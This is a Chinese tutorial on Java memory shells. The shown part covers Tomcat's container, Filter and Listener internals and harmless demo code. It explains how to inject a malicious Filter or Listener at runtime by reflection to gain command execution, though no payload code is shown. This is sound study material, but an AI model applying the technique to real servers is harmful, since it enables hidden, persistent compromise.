![LearnJavaMemshellFromZero](https://socialify.git.ci/W01fh4cker/LearnJavaMemshellFromZero/image?description=1&descriptionEditable=%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E5%AE%8C%E5%85%A8%E9%9B%B6%E5%9F%BA%E7%A1%80%E4%BB%8E0%E5%88%B01%E6%8E%8C%E6%8F%A1Java%E5%86%85%E5%AD%98%E9%A9%AC&forks=1&issues=1&language=1&logo=https%3A%2F%2Fs2.loli.net%2F2022%2F06%2F25%2FgUAh2V5CiD96y8G.jpg&owner=1&pattern=Brick%20Wall&pulls=1&stargazers=1) 
本文目录：
- [一、前言](#一前言)
- [二、前置知识](#二前置知识)
  - [2.1 Servlet容器与Engine、Host、Context和Wrapper](#21-servlet容器与enginehostcontext和wrapper)
  - [2.2 编写一个简单的servlet](#22-编写一个简单的servlet)
  - [2.3 从代码层面看servlet初始化与装载流程](#23-从代码层面看servlet初始化与装载流程)
    - [2.3.1 servlet初始化流程分析](#231-servlet初始化流程分析)
    - [2.3.2 servlet装载流程分析](#232-servlet装载流程分析)
  - [2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain](#24-filter容器与filterdefsfilterconfigsfiltermapsfilterchain)
  - [2.5 编写一个简单的Filter](#25-编写一个简单的filter)
  - [2.6 从代码层面分析Filter运行的整体流程](#26-从代码层面分析filter运行的整体流程)
  - [2.7 Listener简单介绍](#27-listener简单介绍)
  - [2.8 编写一个简单的Listener（ServletRequestListener）](#28-编写一个简单的listenerservletrequestlistener)
  - [2.9 从代码层面分析Listener运行的整体流程](#29-从代码层面分析listener运行的整体流程)
  - [2.10 简单的spring项目搭建](#210-简单的spring项目搭建)
    - [2.10.1 编写一个简单的Spring Controller](#2101-编写一个简单的spring-controller)
    - [2.10.2 编写一个简单的Spring Interceptor](#2102-编写一个简单的spring-interceptor)
    - [2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）](#2103-编写一个简单的spring-webflux的demo基于netty)
  - [2.11 Spring MVC介绍](#211-spring-mvc介绍)
    - [2.11.1 Spring MVC九大组件](#2111-spring-mvc九大组件)
    - [2.11.2 简单的源码分析](#2112-简单的源码分析)
      - [2.11.2.1 九大组件的初始化](#21121-九大组件的初始化)
      - [2.11.2.2 url和Controller的关系的建立](#21122-url和controller的关系的建立)
      - [2.11.2.3 Spring Interceptor引入与执行流程分析](#21123-spring-interceptor引入与执行流程分析)
  - [2.12 Spring WebFlux介绍与代码调试分析](#212-spring-webflux介绍与代码调试分析)
    - [2.12.1 什么是Mono？](#2121-什么是mono)
    - [2.12.2 什么是Flux？](#2122-什么是flux)
    - [2.12.3 Spring WebFlux启动过程分析](#2123-spring-webflux启动过程分析)
    - [2.12.4 Spring WebFlux请求处理过程分析](#2124-spring-webflux请求处理过程分析)
    - [2.12.5 Spring WebFlux过滤器WebFilter运行过程分析](#2125-spring-webflux过滤器webfilter运行过程分析)
  - [2.13 Tomcat Valve介绍与运行过程分析](#213-tomcat-valve介绍与运行过程分析)
    - [2.13.1 Valve与Pipeline](#2131-valve与pipeline)
    - [2.13.2 编写一个简单Tomcat Valve的demo](#2132-编写一个简单tomcat-valve的demo)
    - [2.13.3 Tomcat Valve打入内存马思路分析](#2133-tomcat-valve打入内存马思路分析)
  - [2.14 Tomcat Upgrade介绍与打入内存马思路分析](#214-tomcat-upgrade介绍与打入内存马思路分析)
    - [2.14.1 编写一个简单的Tomcat Upgrade的demo](#2141-编写一个简单的tomcat-upgrade的demo)
      - [2.14.1.1 利用SpringBoot搭建](#21411-利用springboot搭建)
      - [2.14.1.2 利用Tomcat搭建](#21412-利用tomcat搭建)
    - [2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析](#2142-tomcat-upgrade内存马介绍与相关代码调试分析)
  - [2.15 Tomcat Executor内存马介绍与打入内存马思路分析](#215-tomcat-executor内存马介绍与打入内存马思路分析)
    - [2.15.1](#2151)
    - [2.15.2 Tomcat Executor内存马介绍与代码调试分析](#2152-tomcat-executor内存马介绍与代码调试分析)
      - [2.15.2.1 Endpoint五大组件](#21521-endpoint五大组件)
      - [2.15.2.2 Endpoint分类](#21522-endpoint分类)
      - [2.15.2.3 Executor相关代码分析](#21523-executor相关代码分析)
- [三、传统Web型内存马](#三传统web型内存马)
  - [3.1 Servlet内存马](#31-servlet内存马)
    - [3.1.1 简单的servlet内存马demo编写](#311-简单的servlet内存马demo编写)
    - [3.1.2 servlet内存马demo代码分析](#312-servlet内存马demo代码分析)
    - [3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解](#313-关于standardcontextapplicationcontextservletcontext的理解)
  - [3.2 Filter内存马](#32-filter内存马)
    - [3.2.1 简单的filter内存马demo编写](#321-简单的filter内存马demo编写)
    - [3.2.2 servlet内存马demo代码分析](#322-servlet内存马demo代码分析)
    - [3.2.3 tomcat6下filter内存马的编写](#323-tomcat6下filter内存马的编写)
  - [3.3 Listener内存马](#33-listener内存马)
    - [3.3.1 简单的Listener内存马demo编写](#331-简单的listener内存马demo编写)
    - [3.3.2 Listener内存马demo代码分析](#332-listener内存马demo代码分析)
- [四、Spring MVC框架型内存马](#四spring-mvc框架型内存马)
  - [4.1 Spring Controller型内存马](#41-spring-controller型内存马)
    - [4.1.1 简单的Spring Controller型内存马demo编写](#411-简单的spring-controller型内存马demo编写)
    - [4.1.2 Spring Controller型内存马demo代码分析](#412-spring-controller型内存马demo代码分析)
  - [4.2 Spring Interceptor型内存马](#42-spring-interceptor型内存马)
  - [4.3 Spring WebFlux内存马](#43-spring-webflux内存马)
    - [4.3.1 简单的Spring WebFlux内存马demo编写](#431-简单的spring-webflux内存马demo编写)
    - [4.3.2 Spring WebFlux内存马demo代码分析](#432-spring-webflux内存马demo代码分析)
- [五、中间件型内存马](#五中间件型内存马)
  - [5.1 Tomcat Valve型内存马](#51-tomcat-valve型内存马)
  - [5.2 Tomcat Upgrade内存马](#52-tomcat-upgrade内存马)
  - [5.3 Tomcat Executor内存马](#53-tomcat-executor内存马)
- [六、致谢](#六致谢)

# 一、前言

&ensp;&ensp;&ensp;&ensp;之前写的零基础学`Fastjson`的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。  
&ensp;&ensp;&ensp;&ensp;本文所讨论的`Java`内存马是`Java`安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了`su18`师傅一年多以前发表在`Goby`社区的这篇文章（`https://nosec.org/home/detail/5049.html`）中给出的分类方式，把整个零基础掌握`java`内存马系列分成了以下几个部分：传统`web`型、`spring`系列框架型、中间件型、其他内存马（`Websocket/Jsp/线程型/RMI`）、`Agent`型内存马、实战内存马打入（`Jetty`/`Weblogic`/`Shiro`/`Struts2`/`GlassFish`/`xxl-job`...）和内存马。  
&ensp;&ensp;&ensp;&ensp;好了，让我们闲话少叙，就此开始。

# 二、前置知识

本篇文章除特殊说明外，使用的是`jdk1.8.0_202`+ `tomcat 9.0.85`，后者下载地址为：
> https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。

## 2.1 Servlet容器与Engine、Host、Context和Wrapper

这部分我找了好久，终于在一大堆高深/垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。

>  原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li

这里组合引用其原文，简单概括，就是：

`Tomcat`设计了四种容器，分别是`Engine`、`Host`、`Context`和`Wrapper`，其关系如下：
![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165508.png)

这一点可以从`Tomcat`的配置文件`server.xml`中看出来。

此时，设想这样一个场景：我们此时要访问`https://manage.xxx.com:8080/user/list`，那`tomcat`是如何实现请求定位到具体的`servlet`的呢？为此`tomcat`设计了`Mapper`，其中保存了容器组件与访问路径的映射关系。

然后就开始四步走：

1. 根据协议和端口号选定`Service`和`Engine`。

   我们知道`Tomcat`的每个连接器都监听不同的端口，比如`Tomcat`默认的`HTTP`连接器监听`8080`端口、默认的`AJP`连接器监听`8009`端口。上面例子中的URL访问的是`8080`端口，因此这个请求会被`HTTP`连接器接收，而一个连接器是属于一个`Service`组件的，这样`Service`组件就确定了。我们还知道一个`Service`组件里除了有多个连接器，还有一个容器组件，具体来说就是一个`Engine`容器，因此`Service`确定了也就意味着`Engine`也确定了。

2. 根据域名选定`Host`。

   `Service`和`Engine`确定后，`Mapper`组件通过`url`中的域名去查找相应的`Host`容器，比如例子中的`url`访问的域名是`manage.xxx.com`，因此`Mapper`会找到`Host1`这个容器。

3. 根据`url`路径找到`Context`组件。

   `Host`确定以后，`Mapper`根据`url`的路径来匹配相应的`Web`应用的路径，比如例子中访问的是`/user`，因此找到了`Context1`这个`Context`容器。

4. 根据`url`路径找到`Wrapper`（`Servlet`）。

   `Context`确定后，`Mapper`再根据`web.xml`中配置的`Servlet`映射路径来找到具体的`Wrapper`和`Servlet`，例如这里的`Wrapper1`的`/list`。

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165824.png)

这里的`Context`翻译过来就是上下文，它包括`servlet`运行的基本环境；这里的`Wrapper`翻译过来就是包装器，它负责管理一个`servlet`，包括其装载、初始化、执行和资源回收。

关于上图中的连接器的设计，可以继续参考该作者的博文：

> https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de

写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于`tomcat`架构的原理解析：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

## 2.2 编写一个简单的servlet

`pom.xml`文件如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
        </dependency>
    </dependencies>

</project>
```

同步下依赖：
![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174417723.png)

`TestServlet.java`代码如下：

```java
package org.example;
import java.io.IOException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        resp.getWriter().write("hello world");
    }
}
```

然后配置项目运行所需的`tomcat`环境：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174451460.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174520045.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174543728.png)

然后配置`artifacts`，直接点击`fix`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174604960.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174718456.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174740574.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174840311.png)

然后添加`web`模块：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112175314298.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112175906956.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181600664.png)

运行之后，访问http://localhost:8080/testServlet/test：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181649265.png)

## 2.3 从代码层面看servlet初始化与装载流程

主要参考文章：

> https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/

我们这里不采用我们下载的`tomcat`来运行我们的项目，我们使用嵌入式`tomcat`也就是所谓的`tomcat-embed-core`。关于动态调试，我是图省事，直接用`tomcat-embed-core`，你当然也可以调试直接调试`tomcat`源码，环境搭建方法可以参考`Skay`师傅的文章：

> https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw

我们重开一个项目，文件代码如下：

`pom.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-core</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-jasper</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
    </dependencies>

</project>
```

`Main.java`：

```java
package org.example;

import org.apache.catalina.Context;
import org.apache.catalina.LifecycleException;
import org.apache.catalina.startup.Tomcat;
import java.io.File;

public class Main {
    public static void main(String[] args) throws LifecycleException {
        Tomcat tomcat = new Tomcat();
        tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603
        Context context = tomcat.addWebapp("", new File(".").getAbsolutePath());
        Tomcat.addServlet(context, "helloServlet", new HelloServlet());
        context.addServletMappingDecoded("/hello", "helloServlet");
        tomcat.start();
        tomcat.getServer().await();
    }
}
```

`HelloServlet.java`：

```java
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/hello")
public class HelloServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("Hello, World!");
        out.println("</body></html>");
    }
}
```

### 2.3.1 servlet初始化流程分析

我们在`org.apache.catalina.core.StandardWrapper#setServletClass`处下断点调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162053776.png)

我们尝试按`Ctrl+左键`追踪它的上层调用位置，但是提示我们找不到，需要按两次`Ctrl+Alt+F7`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162215565.png)

然后就可以看到，上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162319884.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162405771.png)

接下来我们详细看下面这段代码：
![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115184354717.png)

```java
for (ServletDef servlet : webxml.getServlets().values()) {
            Wrapper wrapper = context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) {
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) {
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                }
                if(null != multipartdef.getMaxRequestSize()) {
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                }
                if(null != multipartdef.getFileSizeThreshold()) {
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                }

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            }
            if (servlet.getAsyncSupported() != null) {
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            }
            wrapper.setOverridable(servlet.isOverridable());
            context.addChild(wrapper);
        }
        for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
```

首先通过`webxml.getServlets()`获取的所有`Servlet`定义，并建立循环；然后创建一个`Wrapper`对象，并设置`Servlet`的加载顺序、是否启用（即获取`</load-on-startup>`标签的值）、`Servlet`的名称等基本属性；接着遍历`Servlet`的初始化参数并设置到`Wrapper`中，并处理安全角色引用、将角色和对应链接添加到`Wrapper`中；如果`Servlet`定义中包含文件上传配置，则根据配置信息设置`MultipartConfigElement`；设置`Servlet`是否支持异步操作；通过`context.addChild(wrapper);`将配置好的`Wrapper`添加到`Context`中，完成`Servlet`的初始化过程。

上面大的`for`循环中嵌套的最后一个`for`循环则负责处理`Servlet`的`url`映射，将`Servlet`的`url`与`Servlet`名称关联起来。

也就是说，`Servlet`的初始化主要经历以下六个步骤：

- 创建`Wapper`对象；
- 设置`Servlet`的`LoadOnStartUp`的值；
- 设置`Servlet`的名称；
- 设置`Servlet`的`class`；
- 将配置好的`Wrapper`添加到`Context`中；
- 将`url`和`servlet`类做映射

### 2.3.2 servlet装载流程分析

我们在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115193750678.png)

可以看到，装载顺序为`Listener`-->`Filter`-->`Servlet`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115194704999.png)

可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：
```java
public boolean loadOnStartup(Container children[]) {
    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
    for (Container child : children) {
        Wrapper wrapper = (Wrapper) child;
        int loadOnStartup = wrapper.getLoadOnStartup();
        if (loadOnStartup < 0) {
            continue;
        }
        Integer key = Integer.valueOf(loadOnStartup);
        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
    }
    for (ArrayList<Wrapper> list : map.values()) {
        for (Wrapper wrapper : list) {
            try {
                wrapper.load();
            } catch (ServletException e) {
                getLogger().error(
                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
                        StandardWrapper.getRootCause(e));
                if (getComputedFailCtxIfServletStartFails()) {
                    return false;
                }
            }
        }
    }
    return true;
}
```

可以看到，这段代码先是创建一个`TreeMap`，然后遍历传入的`Container`数组，将每个`Servlet`的`loadOnStartup`值作为键，将对应的`Wrapper`对象存储在相应的列表中；如果这个`loadOnStartup`值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个`loadOnStartup`的升序的顺序来加载。

## 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain

开头先明确一点，就是`Filter`容器是用于对请求和响应进行过滤和处理的，以下这张图是根据`Skay`师傅文章中的图片重制的：

> https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/filter-demo.png)

从上图可以看出，这个`filter`就是一个关卡，客户端的请求在经过`filter`之后才会到`Servlet`，那么如果我们动态创建一个`filter`并且将其放在最前面，我们的`filter`就会最先执行，当我们在`filter`中添加恶意代码，就可以实现命令执行，形成内存马。

这些名词其实很容易理解，首先，需要定义过滤器`FilterDef`，存放这些`FilterDef`的数组被称为`FilterDefs`，每个`FilterDef`定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及`class`等，这一点可以从`org/apache/tomcat/util/descriptor/web/FilterDef.java`的代码中看出来；然后是`FilterDefs`，它只是过滤器的抽象定义，而`FilterConfigs`则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是`FilterMaps`，它是用于将`FilterConfigs`映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的`FilterConfigs`，从而确定要执行的过滤器链；而`FilterChain`是由多个`FilterConfigs`组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照`FilterChain`中的顺序依次执行每个过滤器，对请求进行过滤和处理。

## 2.5 编写一个简单的Filter

我们继续用我们之前在`2.2`中搭建的环境，添加`TestFilter.java`：

```java
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/test")
public class TestFilter implements Filter {

    public void init(FilterConfig filterConfig) {
        System.out.println("[*] Filter初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[*] Filter执行过滤操作");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public void destroy() {
        System.out.println("[*] Filter已销毁");
    }
}
```

跑起来之后，控制台输出`[*] Filter初始化创建`，当我们访问`/test`路由的时候，控制台继续输出`[*] Filter执行过滤操作`，当我们结束`tomcat`的时候，会触发`destroy`方法，从而输出`[*] Filter已销毁`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116155323191.png)

## 2.6 从代码层面分析Filter运行的整体流程

我们在上面的`demo`中的`doFilter`函数这里下断点进行调试：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116180329213.png)

跟进`org.apache.catalina.core.StandardWrapperValve#invoke`：

```java
filterChain.doFilter(request.getRequest(), response.getResponse());
```

继续跟进变量`filterChain`，找到定义处的代码：

```java
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117003245011.png)

查看该方法（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：

```java
public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
    if (servlet == null) {
        return null;
    } else {
        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) {
            Request req = (Request)request;
            if (Globals.IS_SECURITY_ENABLED) {
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain)req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            filterChain = new ApplicationFilterChain();
        }

        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
        StandardContext context = (StandardContext)wrapper.getParent();
        FilterMap[] filterMaps = context.findFilterMaps();
        if (filterMaps != null && filterMaps.length != 0) {
            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
            String requestPath = null;
            Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
            if (attribute != null) {
                requestPath = attribute.toString();
            }

            String servletName = wrapper.getName();
            FilterMap[] var10 = filterMaps;
            int var11 = filterMaps.length;

            int var12;
            FilterMap filterMap;
            ApplicationFilterConfig filterConfig;
            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            var10 = filterMaps;
            var11 = filterMaps.length;

            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            return filterChain;
        } else {
            return filterChain;
        }
    }
}
```

我们在该方法和下面定义`filterMaps`那行下断点进行调试，可以看到，这段代码先是判断`servlet`是否为空，如果是就表示没有有效的`servlet`，无法创建过滤器链；然后根据传入的`ServletRequest`的类型来分类处理，如果是`Request`类型，并且启用了安全性，那么就创建一个新的`ApplicationFilterChain`，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的`Servlet`和异步支持属性，这个没啥说的；关键点在于后面从`Wrapper`中获取父级上下文（`StandardContext`），然后获取该上下文中定义的过滤器映射数组（`FilterMap`）；最后遍历过滤器映射数组，根据请求的`DispatcherType`和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004652307.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004728760.png)

从上面的两张图我们也可以清晰地看到`filterConfig`、`filterMap`、`FilterDef`的结构。

跟进刚才的`filterChain.doFilter`方法，位于`org.apache.catalina.core.ApplicationFilterChain#doFilter`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005026102.png)

可以看到都是调用了`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`方法，在这个方法中会依次拿到`filterConfig`和`filter`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005923310.png)

好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个`Filter`，回顾之前的调试过程，我们发现在`createFilterChain`那个函数里面有两个关键点：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117010603894.png)

也就是这里我用箭头指出来的`org.apache.catalina.core.StandardContext#findFilterMaps`和`org.apache.catalina.core.StandardContext#findFilterConfig`。

二者的实现代码粘贴如下：

```java
public FilterMap[] findFilterMaps() {
    return filterMaps.asArray();
}

public FilterConfig findFilterConfig(String name) {
    synchronized (filterDefs) {
        return filterConfigs.get(name);
    }
}
```

也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。

那也就是说，我们现在的问题就转化为如何添加`filterMap`和`filterConfig`。我们搜索关键词`addFilterMap`，即可看到在`StandardContext`中有两个相关的方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131207868.png)

注释里面也说的很清楚，`addFilterMap`是在一组映射末尾添加新的我们自定义的新映射；而`addFilterMapBefore`则会自动把我们创建的`filterMap`丢到第一位去，无需再手动排序，这正是我们需要的呀！

可以看到，上面的`addFilterMapBefore`函数中第一步是先执行`org.apache.catalina.core.StandardContext#validateFilterMap`这个函数，点击去看看：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131938707.png)

发现我们需要保证它在根据`filterName`找`filterDef`的时候，得能找到，也就是说，我们还得自定义`filterDef`并把它加入到`filterDefs`，不过这个也很简单，也有对应的方法，也就是`org.apache.catalina.core.StandardContext#addFilterDef`：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132121464.png)

搞定，继续去看`filterConfig`如何添加。经过搜索发现，不存在类似上面的`addFilterConfig`这种方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132257971.png)

但是有`filterStart`和`filterStop`这两个方法：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135001440.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135022708.png)

那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。

## 2.7 Listener简单介绍

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/tomcat.png)

由上图可知，`Listener`是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的`Listener`，就又可以形成一种内存马了。

在`tomcat`中，常见的`Listener`有以下几种：

- `ServletContextListener`，用来监听整个`Web`应用程序的启动和关闭事件，需要实现`contextInitialized`和`contextDestroyed`这两个方法；
- `ServletRequestListener`，用来监听`HTTP`请求的创建和销毁事件，需要实现`requestInitialized`和`requestDestroyed`这两个方法；
- `HttpSessionListener`，用来监听`HTTP`会话的创建和销毁事件，需要实现`sessionCreated`和`sessionDestroyed`这两个方法；
